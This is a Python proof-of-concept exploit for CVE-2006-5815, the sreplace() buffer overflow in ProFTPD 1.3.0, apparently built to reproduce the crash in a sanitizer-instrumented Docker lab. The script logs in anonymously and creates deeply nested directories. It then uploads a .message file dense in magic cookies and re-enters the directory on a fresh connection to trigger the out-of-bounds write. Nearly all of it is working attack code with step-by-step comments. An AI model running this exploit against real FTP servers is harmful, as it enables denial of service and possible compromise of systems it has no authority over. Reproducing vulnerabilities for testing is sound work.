#!/usr/bin/env python3
"""PoC: CVE-2006-5815 - REAL ProFTPD 1.3.0 sreplace() buffer overflow.

Mechanism (src/support.c:sreplace, reached via src/display.c -> pr_display_file
when DisplayChdir renders a .message file):

  Each .message line is expanded against ~21 magic cookies (%C cwd, %U user,
  %V servername, ...). sreplace() sizes its output buffer from
  `blen += count * (strlen(r) - strlen(m))` (size_t in 1.3.0; the 1.3.0a fix
  makes it `int` and adds an `if (blen < 0) return s;` integer-overflow guard,
  a per-cookie `count > 8` cap, and a missing literal-path `goto done`). A
  .message packed with magic cookies whose expansions overrun the mis-sized
  buffer drives sreplace() to write out of bounds -> ASan trap in support.c.

To make the %C (cwd) expansion large we first nest deep directories so
session.cwd is long, then upload a .message dense in %C and re-enter the dir,
which forces DisplayChdir -> pr_display_file -> sreplace on attacker content.

Verify success in `docker logs`: an AddressSanitizer/UBSan trace with a frame
naming sreplace / src/support.c. proftpd forks per connection, so the abort is
in the child; the master keeps running (container exit code may stay 0).

Usage: ftp_proftpd_cve_2006_5815_real_poc.py [host] [port]
"""

import socket
import sys
import time

HOST = sys.argv[1] if len(sys.argv) > 1 else "localhost"
PORT = int(sys.argv[2]) if len(sys.argv) > 2 else 12206


def recv(s, t=4.0):
    s.settimeout(t)
    data = b""
    try:
        while True:
            chunk = s.recv(4096)
            if not chunk:
                break
            data += chunk
            if data.endswith(b"\r\n") and len(chunk) < 4096:
                break
    except (TimeoutError, OSError):
        pass
    return data


def cmd(s, c, t=4.0):
    s.sendall(c + b"\r\n")
    r = recv(s, t)
    sys.stdout.write(f"  > {c.decode(errors='replace')[:70]}\n  < {r.decode(errors='replace').strip()[:120]}\n")
    return r


def pasv_data(s):
    r = cmd(s, b"PASV")
    nums = r.split(b"(")[1].split(b")")[0].split(b",")
    port = int(nums[4]) * 256 + int(nums[5])
    d = socket.socket()
    d.settimeout(6)
    d.connect((HOST, port))
    return d


def main():
    s = socket.socket()
    s.settimeout(8)
    s.connect((HOST, PORT))
    print("[*] banner:", recv(s).decode(errors="replace").strip()[:120])

    cmd(s, b"USER anonymous")
    cmd(s, b"PASS poc@example.com")
    cmd(s, b"TYPE I")

    # 1) Nest deep directories under upload/ so session.cwd becomes long.
    #    Each %C in .message then expands to this long path (the server is
    #    chrooted to /var/ftp, so the visible path is /upload/D.../D...).
    cmd(s, b"CWD upload")
    deep = [b"D" * 60 for _ in range(6)]  # ~6 * 61 chars of cwd depth
    for d in deep:
        cmd(s, b"MKD " + d)
        cmd(s, b"CWD " + d)
    pwd = cmd(s, b"PWD")
    full = pwd.split(b'"')[1].decode(errors="replace") if b'"' in pwd else "/upload"
    print(f"[*] deep cwd established: {full[:80]}")

    # 2) Craft a .message dense in magic cookies. %C => long cwd, %U => "" (len
    #    0 < 2: negative size_t term), plus the historic MSF cookie run. Many
    #    cookies + a long literal tail maximise the expanded length past the
    #    sreplace buffer.
    line = b"%C" * 200 + b"%U" * 200 + b"%V" * 40 + b"%C%A" * 64 + b"A" * 400
    payload = (line + b"\n") * 8  # several long lines, each expanded by sreplace

    d = pasv_data(s)
    cmd(s, b"STOR .message")
    d.sendall(payload)
    d.close()
    time.sleep(0.3)
    recv(s)
    print(f"[*] uploaded .message ({len(payload)} bytes of cookie payload) into {full[:50]}")
    s.close()

    # 3) Trigger on a FRESH connection. DisplayFirstChdir only renders .message
    #    the first time a session enters a directory (it tracks last-visit time
    #    per cwd), so a brand-new login is the reliable trigger: its first CWD
    #    into the payload dir forces pr_display_file() -> sreplace() over the
    #    attacker-controlled .message, with %C expanding to the long cwd.
    print("[*] reconnecting for the trigger (fresh session, no prior visit record)")
    t = socket.socket()
    t.settimeout(8)
    t.connect((HOST, PORT))
    recv(t)
    cmd(t, b"USER anonymous")
    cmd(t, b"PASS poc2@example.com")
    time.sleep(1.2)
    recv(t)
    print(f"[*] triggering: CWD {full[:40]}... (DisplayFirstChdir -> sreplace)")
    cmd(t, b"CWD " + full.encode(), t=8.0)
    cmd(t, b"PWD", t=4.0)
    try:
        t.close()
    except OSError:
        pass
    print("[*] PoC sent. Check `docker logs` for AddressSanitizer in sreplace/support.c")


if __name__ == "__main__":
    main()
